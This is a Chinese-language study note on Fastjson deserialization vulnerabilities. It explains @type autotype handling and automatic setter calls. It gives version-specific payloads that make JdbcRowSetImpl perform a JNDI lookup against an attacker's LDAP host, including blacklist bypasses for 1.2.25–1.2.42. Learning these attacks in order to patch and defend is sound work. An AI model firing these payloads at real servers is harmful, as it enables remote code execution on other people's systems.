在 Fastjson 中，@type 字段用于支持 Polymorphic Deserialization（多态反序列化）。当你将一个 JSON 字符串反序列化为一个 Java 对象时，@type 字段可以指定具体的类类型，这样 Fastjson 可以根据这个类型来实例化正确的对象。

主要用途：
多态支持：如果你有一个父类引用，指向子类对象，反序列化时 Fastjson 无法自动判断对象的具体类型，这时可以通过 @type 明确指定类型。Fastjson 通过 @type 字段的值找到对应的类，并实例化它。

简化复杂的对象反序列化：当 JSON 字符串中包含复杂的嵌套结构或者子类时，使用 @type 可以显式指明反序列化时要使用的类，避免手动管理复杂的类型转换。

## **parse和parseObject**
1. parseObject 方法

   parseObject 是用于将 JSON 字符串直接反序列化为指定类型的对象。你需要提供一个目标类型，Fastjson 会根据这个类型将 JSON 转换为对应的 Java 对象。
```java
<T> T parseObject(String text, Class<T> clazz);
```
返回类型：返回的是指定类型的 Java 对象。
用法场景：适用于你知道具体目标类型的场景，通常用于将 JSON 反序列化为某个类实例。
PS：即使JSON.parseObject(json, User.class)指定为User，JSON中有使用@type指定的类型（如 java.util.ArrayList）会覆盖 User 类，导致实际反序列化为 ArrayList 类型。或json里面再套一层恶意类json。

2. parse 方法

  parse 方法用于将 JSON 字符串解析为通用的 JSONObject 或 JSONArray，不需要指定具体的目标类型。parse 可以返回一个 JSONObject 或者 JSONArray，但不会直接返回某个特定类的实例。

```java
Object parse(String text);

```
返回类型：返回的是一个通用的 Object 对象，具体类型可能是 JSONObject 或 JSONArray，取决于 JSON 字符串的内容。

用法场景：适用于你不确定 JSON 结构，或者只想将 JSON 解析为通用的对象结构时。




## **利用条件**
其中getter自动调用还需要满足以下条件：

- 方法名长度大于4
- 非静态方法
- 以get开头且第四个字母为大写
- 无参数传入
- 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong

setter自动调用需要满足以下条件：
- 方法名长度大于4
- 非静态方法
- 返回值为void或者当前类
- 以set开头且第四个字母为大写
- 参数个数为1个


除此之外Fastjson还有以下功能点：

- 如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用```Feature.SupportNonPublicField```参数
- fastjson 在为类属性寻找getter/setter方法时，调用函数```com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()```方法，会忽略_ -字符串
- fastjson 在反序列化时，如果Field类型为byte[]，将会调用```com.alibaba.fastjson.parser.JSONScanner#bytesValue```进行base64解码，在序列化时也会进行base64编码


## **1.2.24**
不出网:  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl

出网: com.sun.rowset.JdbcRowSetImpl
>Fastjson反序列化自动调用类中的setXxx(一个参数) 类似的方法，即使类中没有xxx属性。
>com.sun.rowset.JdbcRowSetImpl类中有setDataSourceName。同时有ctx.lookup(getDataSourceName())触发jndi。
```
public static void main(String[] args) {
        String s = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"DataSourceName\":\"ldap://192.168.142.129:8085/YMLGKzIJ\"," +
                "\"autoCommit\":false}";
        JSON.parseObject(s);
    }
```

## **1.2.25-1.2.41**
在此版本中，新增了黑名单和白名单功能
在`ParserConfig`中，可以看到黑名单的内容，而且设置了一个`autoTypeSupport`用来控制是否可以反序列化，`autoTypeSupport`默认为false且禁止反序列化，为true时会使用checkAutoType来进行安全检测
```
String s = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://192.168.142.129:8085/JQwoRjuX\",\"autoCommit\":true}";
```

## **1.2.42**
```
 String s = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://192.168.142.129:8085/JQwoRjuX\",\"autoCommit\":true}";

```

## **1.2.43**
 参考链接
<https://tttang.com/archive/1579/#toc_1268>

<https://xz.aliyun.com/t/7107?time__1311=n4%2BxnD0Dy7f%2BGOD9DBqro3GQQ1eWqxnYID>

<https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/>

<https://tttang.com/archive/1579/#toc_1242>
<https://su18.org/post/fastjson/#8-fastjson-1268>



^
## **更多Fastjson不出网利用**
常见的利用一般为bcel或者c3p0。尝试bcel利用直接命令执行。
https://github.com/safe6Sec/Fastjson


